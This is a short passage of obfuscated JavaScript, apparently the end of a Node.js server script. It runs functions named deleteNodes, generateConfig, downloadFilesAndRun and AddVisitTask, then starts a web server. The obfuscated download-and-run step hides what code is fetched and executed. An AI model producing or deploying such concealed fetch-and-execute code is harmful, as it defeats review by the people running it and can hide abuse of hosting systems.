_0x1e73ef=_0x2245cd[_0x5bd74d];return _0x1e73ef;}async function startserver(){const _0x22b248=_0x32ae6f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5c90cd){console[_0x22b248(0x142)](_0x22b248(0x150),_0x5c90cd);}}startserver()['catch'](_0x522805=>{const _0x4d4c5a=_0x32ae6f;console[_0x4d4c5a(0x142)](_0x4d4c5a(0x179),_0x522805);}),app['listen'](PORT,()=>console[_0x32ae6f(0x1b2)](_0x32ae6f(0x13d)+PORT+'!'));
